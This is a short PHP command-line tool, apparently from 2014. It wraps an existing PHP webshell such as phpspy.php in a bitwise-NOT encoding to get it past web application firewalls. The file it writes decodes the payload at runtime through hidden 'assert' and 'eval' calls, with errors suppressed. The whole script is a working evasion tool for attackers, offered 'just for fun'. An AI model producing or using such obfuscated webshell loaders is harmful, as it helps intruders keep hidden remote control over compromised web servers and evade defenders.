<?php
	/*
	 * Author: Laterain
	 * Time: 20140414
	 * About: Use bitwise(~) to encrypt php webshell, Bypass the WAF
	 * Just For Fun
	 */
	if ($argc < 3) {
		echo '  ____  _ _            _'."\r\n";          
		echo ' |  _ \(_) |          (_)'."\r\n";         
		echo ' | |_) |_| |___      ___ ___  ___ '."\r\n";
		echo ' |  _ <| | __\ \ /\ / / / __|/ _ \\'."\r\n";
		echo ' | |_) | | |_ \ V  V /| \__ \  __/'."\r\n";
		echo ' |____/|_|\__| \_/\_/ |_|___/\___|'."\r\n";
		echo "#usage: php $argv[0] webshell outputfile\r\n";
		echo "#E x p: php $argv[0] phpspy.php nokill.php\r\n";
		exit;
	}
                         
	$source = $argv[1];
	$output = $argv[2];
	$source = php_strip_whitespace($source);
	$source = trim(trim(trim($source, '<?php'),'<?'),'?>');
	$source = '~'.(~$source);
	
	$shellcode = '<?php ';
	$shellcode .= '@$code = '.$source.';';
	$shellcode .= '@$s1 = ~'.(~'assert').';';
	$shellcode .= '@$s2 = ~'.(~'@eval($code)').';';
	$shellcode .= '@$s1($s2)'.'; ';
	$shellcode .= '?>';
	
	file_put_contents($output, $shellcode);
?>
